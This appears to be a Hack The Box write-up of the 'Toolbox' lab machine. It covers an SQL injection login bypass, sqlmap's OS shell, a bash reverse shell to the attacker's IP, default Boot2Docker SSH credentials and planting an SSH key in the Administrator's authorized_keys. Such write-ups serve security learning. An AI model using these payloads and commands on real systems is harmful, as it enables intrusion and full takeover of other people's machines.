
![Image Toolbox](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Toolbox/Toolbox1.png)


## ----------->> Toolbox <<-------------


// We start with nmap scan 

    $ nmap -sV -A -Pn -T4 10.10.10.236 -p-
--------

    Nmap scan report for 10.10.10.236
    Host is up (0.21s latency).
    Not shown: 65521 closed tcp ports (conn-refused)
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           FileZilla ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
    | ftp-syst: 
    |_  SYST: UNIX emulated by FileZilla
    22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
    |   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
    |_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
    | Not valid before: 2020-02-18T17:45:56
    |_Not valid after:  2021-02-17T17:45:56
    | tls-alpn: 
    |_  http/1.1
    |_http-title: MegaLogistics
    445/tcp   open  microsoft-ds?
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-09-12T14:26:38
    |_  start_date: N/A

// Navigating to https://10.10.10.236/ got us a webpage of shipping and logistics company.

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Toolbox/1.png)

// View the certificate there is a mention of subdomain called 'admin.megalogistic.com'

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Toolbox/2.png)

// Lets add this subdomain to /etc/hosts

    $ cat /etc/hosts
    
    # Host addresses
    10.10.10.236 megalogistic.com admin.megalogistic.com

// Navigating to https://admin.megalogistic.com get us a login page

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Toolbox/3.png)

// Moving on, we notice that we have also FTP service running 

// We can check if we can connect anonymously

    $ ftp -p 10.10.10.236
    Connected to 10.10.10.236.
    220-FileZilla Server 0.9.60 beta
    220-written by Tim Kosse (tim.kosse@filezilla-project.org)
    220 Please visit https://filezilla-project.org/
    Name (10.10.10.236:r4r3): anonymous
    331 Password required for anonymous
    Password:
    230 Logged on
    Remote system type is UNIX.
    ftp> 

// It worked! lets see what we can get 

// We can see that there only one file called 'docker-toolbox.exe'. lets download him.

    ftp> dir
    227 Entering Passive Mode (10,10,10,236,199,146)
    150 Opening data channel for directory listing of "/"
    -r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
    226 Successfully transferred "/"
    ftp> get docker-toolbox.exe
    local: docker-toolbox.exe remote: docker-toolbox.exe
    227 Entering Passive Mode (10,10,10,236,205,243)
    150 Opening data channel for file download from server of "/docker-toolbox.exe"

// After some digging i found that [docker-toolbox](https://docs.bitnami.com/containers/how-to/install-docker-in-windows/) is an solution for windows OS to run docker before windows had native docker support

// Nothing more there, moving on...


// Navigating to https://admin.megalogistic.com and try to login with ' 

// response us with some text above

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Toolbox/4.png)

    Warning: pg_query(): Query failed: ERROR: syntax error at or near ")" LINE 1: ...T * FROM users WHERE username = ''' AND password = md5('''); ^ in /var/www/admin/index.php on line 10

    Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11

// It seems that this login page is vulnerable to sql injection on login page attack

// [This](https://www.geeksforgeeks.org/authentication-bypass-using-sql-injection-on-login-page/) article helped me a lot to understant the attack and the query

    ' or 1=1--+

// And we loged in to admin dashboard!

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Toolbox/5.png)



### --Reverse Shell--


// After we loged in succesfuly using sql injection 

// There is a way to get shell with [sqlmap](https://sqlmap.org/) using '--os-shell' flag 

// First we need to capture a clean login request with BurpSuite and right click on the request then 'Copy to file'

// We will call that file 'login.req'

    $ sqlmap -r login.req --force-ssl --batch --os-shell
    ...
    os-shell> 

// Then we will open a listiner with nc

    $ nc -lvnp 1444
    listening on [any] 1444 ...

// And we run command 

    os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.6/1444 0>&1"
-----

    $ nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.6] from (UNKNOWN) [10.10.10.236] 49863
    bash: cannot set terminal process group (802): Inappropriate ioctl for device
    bash: no job control in this shell

    postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ id
    id
    uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)

// We got reverse shell as postgres ! but, we're in container so we not connected to the actual machine

// We can see with 'ifconfig' that we have other ip

    @bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
    ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
    RX packets 2667  bytes 448010 (437.5 KiB)
    RX errors 0  dropped 0  overruns 0  frame 0
    TX packets 2183  bytes 641275 (626.2 KiB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
    inet 127.0.0.1  netmask 255.0.0.0
    loop  txqueuelen 1000  (Local Loopback)
    RX packets 7282  bytes 2383769 (2.2 MiB)
    RX errors 0  dropped 0  overruns 0  frame 0
    TX packets 7282  bytes 2383769 (2.2 MiB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

// The ip is 172.17.0.2 as we expected(not 10.10.10.236)

// Lets move on, we can check if the machine has python installed

    postgres@bc56e3cc55e9:/$ which python                             
    which python
    postgres@bc56e3cc55e9:/$ which python3
    which python3
    /usr/bin/python3

// We got python3 installed, lets upgrade our shell to use all TTY

    postgres@bc56e3cc55e9:/$ python3 -c 'import pty;pty.spawn("bash")'
    python3 -c 'import pty;pty.spawn("bash")'
    postgres@bc56e3cc55e9:/$ ^Z
    [1]+  Stopped                 nc -lvnp 1444

    [root@kali]──╼ $ stty raw -echo; fg
    nc -lvnp 1444

    postgres@bc56e3cc55e9:/$

// and we got user flag !

    postgres@bc56e3cc55e9:/$ cd ~
    postgres@bc56e3cc55e9:/var/lib/postgresql$ ls
    11  user.txt
    postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
    f0183e4.................




## --Privilleges Escalation--


// Reading a bit about [docker-toolbox](https://docker-docs.netlify.app/toolbox/toolbox_install_windows/#step-3-verify-your-installation)

// Its seems that on windows OS that tool download a lightweight VM of linux called [Boot2Docker](https://github.com/boot2docker/boot2docker#ssh-into-vm)

// And run the docker with containers above him, Also we can see that we can SSH to the docker

    user: docker
    pass: tcuser

// Since we dont know what the VM Host ip is, i have successful login in first attempt 

// due the fact that the machine ip is *.*.0.2 so i gueesed the Host is *.*.0.1

    postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
    docker@172.17.0.1's password: 

       ( '>')
      /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
     (/-_--_-\)           www.tinycorelinux.net

    docker@box:~$ id
    uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)

// We can check if its boot2docker machine now

    root@box:/home/docker# uname -a                                                
    Linux box 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux

// Now we have root over docker container 

// Searching for interesting files i came accros folder called 'c' in home directory

// 

    docker@box:/$ ls -al                                                           
    total 244
    drwxr-xr-x   17 root     root           440 Sep 13 04:05 .
    drwxr-xr-x   17 root     root           440 Sep 13 04:05 ..
    drwxr-xr-x    2 root     root          1420 Sep 13 04:03 bin
    drwxr-xr-x    3 root     root            60 Sep 13 04:05 c
    drwxrwxr-x   14 root     staff         4340 Sep 13 04:03 dev
    drwxr-xr-x    9 root     root          1000 Sep 13 04:05 etc
    drwxrwxr-x    4 root     staff           80 Sep 13 04:03 home
    ...
    dr-xr-xr-x   13 root     root             0 Sep 13 04:03 sys
    drwxr-xr-x    7 root     root           140 Sep 13 04:03 usr
    drwxrwxr-x    8 root     staff          180 Sep 13 04:03 var

// Digging in there is Administrator folder and there is .ssh directory

    docker@box:/c/Users/Administrator$ ls -al                                      
    total 1473
    drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
    dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
    drwxrwxrwx    1 docker   staff         4096 Sep 13 04:02 .VirtualBox
    drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
    drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .ssh
    dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
    drwxrwxrwx    1 docker   staff            0 Feb 18  2020 AppData
    ...
    -rwxrwxrwx    1 docker   staff        32768 Feb 18  2020 ntuser.dat.LOG1
    -rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 ntuser.dat.LOG2
    -rwxrwxrwx    1 docker   staff           20 Feb 18  2020 ntuser.ini


    docker@box:/c/Users/Administrator$ ls -al                                 
    total 18
    drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .
    drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 ..
    -rwxrwxrwx    1 docker   staff          582 Sep 13 09:22 authorized_keys
    -rwxrwxrwx    1 docker   staff         1675 Feb 19  2020 id_rsa
    -rwxrwxrwx    1 docker   staff          404 Feb 19  2020 id_rsa.pub
    -rwxrwxrwx    1 docker   staff          348 Feb 19  2020 known_hosts

// We can try to inject a new our ssh key to authorized_keys

// First we need to generate a new ssh-key with command 'ssh-keygen'

    $ ssh-keygen

    $ ls
    id_rsa  id_rsa.pub

// Now we will copy the contant of id_rsa.pub and try to inject it to authorized_keys

    $ cat id_rsa.pub

     id_rsa.pub 
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzYPoH5/fslVEOpuC2XpjGTt2..TgbJz0NE= root@kali
------

    docker@box:/c/Users/Administrator/.ssh$ echo "id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzYPoH5/fslVEOpuC2XpjGTt2..TgbJz0NE= root@kali" > authorized_keys
------

    docker@box:/c/Users/Administrator/.ssh$ cat authorized_keys   
     id_rsa.pub 
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzYPoH5/fslVEOpuC2XpjGTt2..TgbJz0NE= root@kali

// Alsome, we have write permissions on authorized_keys

// Now elevate our private key permissions

    $ chmod 600 id_rsa

// And connect to machine

    $ssh -i id_rsa administrator@10.10.10.236

    Microsoft Windows [Version 10.0.17763.1039]
    (c) 2018 Microsoft Corporation. All rights reserved.

    administrator@TOOLBOX C:\Users\Administrator>whoami
    toolbox\administrator

// And we got administartor !!!

// And also the flag !

    administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt
    cc9a0b7.................

